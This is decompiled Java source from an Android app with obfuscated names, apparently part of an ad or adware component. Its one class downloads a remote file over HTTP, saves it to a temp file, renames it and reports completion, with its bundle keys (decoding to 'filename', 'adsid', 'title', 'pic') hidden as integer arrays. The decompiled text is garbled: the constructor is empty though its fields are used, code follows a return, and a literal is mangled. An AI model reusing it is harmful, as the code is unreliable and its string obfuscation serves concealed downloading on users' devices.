package rjvjf.egsth.grayncrrl;

import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.HttpParams;
import rjvjf.egsth.grayncrrl.tools.o;

class z
  implements Runnable
{
  z(VDosjbc paramVDosjbc, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, File paramFile) {}
  
  public void run()
  {
    Object localObject2 = this.b;
    Object localObject1 = new HttpGet(this.c);
    Object localObject3 = new DefaultHttpClient();
    ((HttpClient)localObject3).getParams().setParameter("http.connection.timeout", Integer.valueOf(20000));
    try
    {
      localObject3 = ((HttpClient)localObject3).execute((HttpUriRequest)localObject1);
      if (((HttpResponse)localObject3).getStatusLine().getStatusCode() == 200)
      {
        VDosjbc.a(this.a, this.b, "0");
        localObject1 = new Bundle();
        ((Bundle)localObject1).putString(o.a(new int[] { 31, 34, 37, 30, 39, 26, 38, 30 }), this.d);
        ((Bundle)localObject1).putString(o.a(new int[] { 26, 29, 44, 34, 29 }), (String)localObject2);
        ((Bundle)localObject1).putString(o.a(new int[] { 45, 34, 45, 37, 30 }), this.e);
        ((Bundle)localObject1).putString(o.a(new int[] { 41, 34, 28 }), this.f);
        localObject2 = ((HttpResponse)localObject3).getEntity().getContent();
        localObject3 = new File(this.a.d, this.d + "_tmp");
        if (((File)localObject3).exists()) {
          ((File)localObject3).delete();
        }
        FileOutputStream localFileOutputStream = new FileOutputStream((File)localObject3);
        byte[] arrayOfByte = new byte['Ð€'];
        for (;;)
        {
          int i = ((InputStream)localObject2).read(arrayOfByte);
          if (i == -1)
          {
            localFileOutputStream.flush();
            localFileOutputStream.close();
            ((File)localObject3).renameTo(this.g);
            VDosjbc.a(this.a, this.b, "1");
            localObject2 = new Message();
            ((Message)localObject2).what = 5;
            ((Message)localObject2).setData((Bundle)localObject1);
            this.a.g.sendMessage((Message)localObject2);
            return;
          }
          localFileOutputStream.write(arrayOfByte, 0, i);
        }
      }
      return;
    }
    catch (ClientProtocolException localClientProtocolException)
    {
      VDosjbc.a(this.a, this.b, "2");
      return;
      VDosjbc.a(this.a, this.b, "2");
      return;
    }
    catch (IOException localIOException)
    {
      VDosjbc.a(this.a, this.b, "2");
    }
  }
}
